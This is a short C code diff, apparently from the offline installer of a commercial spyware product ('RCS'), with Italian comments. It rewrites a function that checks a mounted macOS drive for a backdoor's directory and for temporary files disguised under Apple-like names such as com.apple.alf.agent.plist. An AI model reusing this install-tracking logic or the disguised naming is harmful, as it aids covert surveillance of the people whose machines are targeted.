@@ -26,8 +26,9 @@ DWORD MAC_GetUserRCSStatus(users_struct_t *user_info, rcs_struct_t *rcs_info, os
 {
 	WCHAR backdoor_path[MAX_PATH];
 	HANDLE hfile;
-	BOOL is_dir=FALSE, is_files=FALSE/*, is_startup=FALSE*/;
+	BOOL is_dir=FALSE, is_files=FALSE, is_temp_dir=FALSE, is_temp_files=FALSE;
 
+	// Controlla se ci sono directory e file della backdoor running
 	MAC_GetSourceFileDirectory(user_info, rcs_info, os_info, backdoor_path);
 	hfile = CreateFile(backdoor_path, 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, NULL);
 	if (hfile != INVALID_HANDLE_VALUE) {
@@ -42,20 +43,35 @@ DWORD MAC_GetUserRCSStatus(users_struct_t *user_info, rcs_struct_t *rcs_info, os
 		}
 	}
 
-	//_snwprintf_s(backdoor_path, MAX_PATH, _TRUNCATE, L"%s\\Library\\Preferences\\com.apple.SystemLoginItems.plist", os_info->drive);
-	//hfile = CreateFile(backdoor_path, 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
-	//if (hfile != INVALID_HANDLE_VALUE) {
-	//	CloseHandle(hfile);
-	//	is_startup = TRUE;
-	//}
+	// Controlla se c'e' la directory e i file temporanei 
+	swprintf_s(backdoor_path, MAX_PATH, L"%s%s\\Library\\Preferences\\%s_", os_info->drive, SlashToBackSlash(user_info->user_home), rcs_info->hdir);
+	hfile = CreateFile(backdoor_path, 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, NULL);
+	if (hfile != INVALID_HANDLE_VALUE) {
+		CloseHandle(hfile);
+		is_temp_dir = TRUE;
 
-	if (!is_dir /*&& !is_startup*/)
+		swprintf_s(backdoor_path, MAX_PATH, L"%s\\com.apple.alf.agent.plist", backdoor_path);
+		hfile = CreateFile(backdoor_path, 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
+		if (hfile != INVALID_HANDLE_VALUE) {
+			CloseHandle(hfile);
+			is_temp_files = TRUE;
+		}
+	}
+
+	// Se e' pulito
+	if (!is_dir && !is_temp_dir)
 		return RCS_CLEAN;
 
-	if (/*!is_startup ||*/ !is_files)
-		return RCS_BROKEN;
+	// Se e' appena stato installato offline
+	if (is_temp_files && !is_dir)
+		return RCS_INSTALLED;
 
-	return RCS_INSTALLED;
+	// Se sta runnando bene
+	if (is_files && !is_temp_dir)
+		return RCS_INSTALLED;
+
+	// Se qualcosa non va
+	return RCS_BROKEN;
 }
 
 users_struct_t *MAC_GetUserList(os_struct_t *os_info, rcs_struct_t *rcs_info)
